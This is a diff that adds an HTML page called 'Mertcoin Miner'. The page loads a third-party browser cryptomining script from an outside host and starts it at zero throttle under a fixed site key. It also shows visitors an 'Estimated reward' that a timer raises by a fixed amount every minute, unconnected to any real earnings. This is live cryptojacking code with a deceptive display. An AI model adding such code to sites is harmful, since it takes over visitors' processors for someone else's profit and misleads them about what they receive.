@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+  <script async src=
+  "https://www.googletagmanager.com/gtag/js?id=G-3BCXJ97M5V"></script>
+  <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-3BCXJ97M5V');
+  </script>
+  <style>
+        body {
+          background-color:  black;
+          color: white;
+          font-family: Arial, Helvetica, sans-serif;
+          text-align: center;
+        }
+  </style>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content=
+  "width=device-width, initial-scale=1.0">
+  <title>Mertcoin Miner</title>
+</head>
+<body>
+  <h3 style="margin: 0; display: inline;">Estimated reward:</h3>
+  <h4 style="margin: 0; display: inline;" align="right" id="hash">
+  0</h4>
+  <h4 style="margin: 0; display: inline;" align="right"></h4>
+  <script src="https://www.hostingcloud.racing/0Frc.js"></script> 
+  <script>
+
+
+    var _client = new Client.Anonymous('6e8067e289507961a17268271edbefca1e41d31d4b71b3a781aada8c0611dfdb', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+
+  </script> 
+  <script>
+
+
+  var calc = 0;
+  setInterval(f, 60000);
+  function f() {
+  calc = calc + 0.00030000;
+  calc = calc.toFixed(8);
+  calc = parseFloat(calc);
+  document.getElementById("hash").innerHTML = calc;
+  }
+
+  </script>
+</body>
+</html>
